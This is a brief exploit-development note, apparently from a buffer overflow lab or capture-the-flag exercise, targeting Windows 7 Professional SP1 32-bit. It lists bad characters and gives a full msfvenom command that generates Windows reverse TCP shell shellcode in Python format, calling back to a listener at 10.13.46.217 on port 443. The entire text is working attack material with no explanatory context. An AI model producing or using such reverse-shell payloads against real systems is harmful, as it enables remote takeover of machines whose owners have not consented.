

Created for Windows 7 Professional SP1 32bits

Badchars: \x00\x1d\x2e\xc7\xee

Msfvenom: msfvenom -p windows/shell_reverse_tcp lhost=10.13.46.217 lport=443 exitfunc=thread -b "\x00\x1d\x2e\xc7\xee" -v esp -f python
